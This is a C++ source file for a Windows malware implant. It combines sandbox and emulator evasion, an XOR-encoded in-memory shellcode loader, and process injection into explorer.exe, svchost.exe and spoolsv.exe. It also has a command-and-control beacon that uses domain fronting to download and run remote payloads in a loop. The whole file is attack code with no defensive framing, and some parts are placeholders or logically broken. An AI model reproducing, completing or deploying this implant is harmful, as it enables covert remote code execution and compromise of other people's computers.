#include <winsock2.h> 
#include <ws2ipdef.h>
#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <iphlpapi.h>
#include <netioapi.h>
#include <iostream>
#include <thread>
#include <mutex>
#include <random>
#include <array>
#include <atomic>
#include <cstdint>
#include <intrin.h>
#include <psapi.h>
#include <shlwapi.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "iphlpapi.lib")

// Forward declarations
extern "C" NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

extern "C" NTSTATUS NtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

extern "C" NTSTATUS NtCreateThreadEx(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartAddress,
    PVOID Parameter,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

// Single SandboxDetector definition
class SandboxDetector {
private:
    bool checkMemory() {
        MEMORYSTATUSEX memInfo;
        memInfo.dwLength = sizeof(MEMORYSTATUSEX);
        GlobalMemoryStatusEx(&memInfo);
        return (memInfo.ullTotalPhys < 4ULL * 1024ULL * 1024ULL * 1024ULL);
    }

    bool checkProcesses() {
        DWORD processes[1024], cbNeeded;
        if(EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
            return (cbNeeded/sizeof(DWORD) < 50);
        }
        return true;
    }

    bool checkNetwork() {
        ULONG size = 0;
        if (GetAdaptersAddresses(AF_UNSPEC, 0, nullptr, nullptr, &size) == ERROR_BUFFER_OVERFLOW) {
            std::vector<uint8_t> buffer(size);
            auto adapters = reinterpret_cast<PIP_ADAPTER_ADDRESSES>(buffer.data());
            if (GetAdaptersAddresses(AF_UNSPEC, 0, nullptr, adapters, &size) == NO_ERROR) {
                size_t count = 0;
                for (auto current = adapters; current; current = current->Next) {
                    count++;
                }
                return count < 2;
            }
        }
        return true;
    }

public:
    bool isSandboxed() {
        return checkMemory() || checkProcesses() || checkNetwork();
    }
};

// **********************
// *  Secure Memory Ops *
// **********************
class MemoryGuard {
private:
    void* address;
    size_t size;
    
public:
    MemoryGuard(void* addr, size_t sz) : address(addr), size(sz) {}
    ~MemoryGuard() {
        SecureZeroMemory(address, size);
        VirtualFree(address, 0, MEM_RELEASE);
    }
};

// **********************
// *  Polymorphic Loader*
// **********************
class GhostLoader {
private:
    std::vector<uint8_t> payload;
    std::atomic<bool> activated{false};
    
    // Add key as class member
    uint8_t key;
    
    void entropy_check() {
        LARGE_INTEGER freq, start, end;
        QueryPerformanceFrequency(&freq);
        QueryPerformanceCounter(&start);
        
        // Artificial computation
        volatile double x = 1.0;
        for(int i = 0; i < 1000000; ++i) {
            x += std::sin(x);
        }
        
        QueryPerformanceCounter(&end);
        double duration = (end.QuadPart - start.QuadPart) / (double)freq.QuadPart;
        
        if(duration < 0.01) exit(0); // Too fast - likely emulated
    }

public:
    GhostLoader(const std::vector<uint8_t>& bin) : payload(bin) {
        // Generate random key in constructor
        std::mt19937 rng(GetTickCount());
        std::uniform_int_distribution<uint8_t> dist(1, 255);
        key = dist(rng);
        entropy_check();
    }

    void deploy() {
        if(activated.exchange(true)) return;

        void* execMem = nullptr;
        SIZE_T memSize = payload.size();
        NtAllocateVirtualMemory(GetCurrentProcess(), &execMem, 0, &memSize, 
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if(!execMem) return;

        unsigned char* execBuffer = static_cast<unsigned char*>(execMem);
        for(size_t i = 0; i < payload.size(); ++i) {
            execBuffer[i] = payload[i] ^ key;
        }

        ULONG oldProtect;
        NtProtectVirtualMemory(GetCurrentProcess(), &execMem, &memSize, 
            PAGE_EXECUTE_READ, &oldProtect);

        HANDLE hThread;
        NtCreateThreadEx(&hThread, GENERIC_EXECUTE, nullptr, 
            GetCurrentProcess(), execMem, nullptr, 0, 0, 0, 0, nullptr);

        if(hThread) CloseHandle(hThread);
    }
};

void haunt_process(const std::wstring& target) {
    PROCESSENTRY32W pe = { sizeof(pe) };
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if(Process32FirstW(snapshot, &pe)) {
        do {
            if(target == pe.szExeFile) {
                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
                if(hProcess) {
                    void* remoteMem = VirtualAllocEx(hProcess, nullptr, 4096, 
                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                        
                    if(remoteMem) {
                        unsigned char shellcode[] = { 
                            0x48, 0x83, 0xEC, 0x28, 0x48, 0xB9, 0x90, 0x90,
                            0x90, 0x90, 0x90, 0x90, 0x90, 0x90
                        };
                        
                        WriteProcessMemory(hProcess, remoteMem, shellcode, 
                            sizeof(shellcode), nullptr);
                            
                        QueueUserAPC((PAPCFUNC)remoteMem, 
                            OpenThread(THREAD_ALL_ACCESS, FALSE, 
                            GetCurrentThreadId()), (ULONG_PTR)remoteMem);
                    }
                    CloseHandle(hProcess);
                }
            }
        } while(Process32NextW(snapshot, &pe));
    }
    CloseHandle(snapshot);
}

// **********************
// *   C2 Beacon Core   *
// **********************
class PhantomBeacon {
private:
    std::string c2_url;
    std::vector<uint8_t> session_key;
    std::mutex crypto_lock;
    GhostLoader& loader;
    
    std::vector<uint8_t> generate_session_key() {
        HCRYPTPROV hProv;
        CryptAcquireContext(&hProv, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
        
        std::vector<uint8_t> key(32);
        CryptGenRandom(hProv, key.size(), key.data());
        CryptReleaseContext(hProv, 0);
        
        return key;
    }

    std::wstring domain_front() {
        const wchar_t* fronts[] = {
            L"cdn.microsoft.com",
            L"aws.amazon.com",
            L"googleapis.com"
        };
        
        SYSTEMTIME st;
        GetLocalTime(&st);
        return fronts[(st.wMilliseconds % 3)];
    }

    bool verifyServerCert(HINTERNET hRequest) {
        PCERT_CONTEXT certContext = nullptr;
        DWORD certInfoSize = sizeof(certContext);
        
        if(WinHttpQueryOption(hRequest, 
            WINHTTP_OPTION_SERVER_CERT_CONTEXT,
            &certContext, &certInfoSize)) {
                
            // Add your certificate pinning logic here
            const uint8_t expectedThumbprint[] = {
                0x01,0x02,0x03,0x04 // Replace with actual thumbprint
            };
            
            bool match = memcmp(certContext->pbCertEncoded,
                expectedThumbprint, sizeof(expectedThumbprint)) == 0;
                
            CertFreeCertificateContext(certContext);
            return match;
        }
        return false;
    }
    
    // Add encrypted configuration
    struct Config {
        uint8_t key[32];
        char c2_domains[3][256];
        uint32_t sleep_time;
    } config;

public:
    PhantomBeacon(GhostLoader& ld) : loader(ld) {
        session_key = generate_session_key();
    }

    void beacon_loop() {
        while(true) {
            // Domain fronting
            auto front = domain_front();
            
            HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", 
                WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
                WINHTTP_NO_PROXY_NAME, 
                WINHTTP_NO_PROXY_BYPASS, 0);
                
            HINTERNET hConnect = WinHttpConnect(hSession, front.c_str(), 
                INTERNET_DEFAULT_HTTPS_PORT, 0);
            
            if(hConnect) {
                HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", 
                    L"/api/v1/weather", nullptr, WINHTTP_NO_REFERER, 
                    WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
                
                if(hRequest) {
                    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                        WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
                        
                    if(WinHttpReceiveResponse(hRequest, nullptr)) {
                        DWORD dwSize;
                        WinHttpQueryDataAvailable(hRequest, &dwSize);
                        
                        std::vector<uint8_t> buffer(dwSize);
                        DWORD dwDownloaded;
                        WinHttpReadData(hRequest, buffer.data(), dwSize, &dwDownloaded);
                        
                        // Decrypt and execute
                        std::lock_guard<std::mutex> lock(crypto_lock);
                        for(auto& b : buffer) b ^= session_key[dwDownloaded % session_key.size()];
                        
                        GhostLoader newLoader(buffer);
                        newLoader.deploy();
                    }
                    WinHttpCloseHandle(hRequest);
                }
                WinHttpCloseHandle(hConnect);
            }
            WinHttpCloseHandle(hSession);
            
            // Random sleep with jitter
            std::this_thread::sleep_for(std::chrono::minutes(5 + (GetTickCount() % 10)));
        }
    }
};

int main() {
    SandboxDetector detector;
    if(detector.isSandboxed()) {
        ExitProcess(0);
    }

    std::vector<uint8_t> dummy(1024, 0x90);
    GhostLoader loader(dummy);
    
    const wchar_t* targets[] = {
        L"explorer.exe",
        L"svchost.exe",
        L"spoolsv.exe"
    };
    
    for(auto target : targets) {
        haunt_process(target);
    }
    
    PhantomBeacon beacon(loader);
    beacon.beacon_loop();
    
    return 0;
}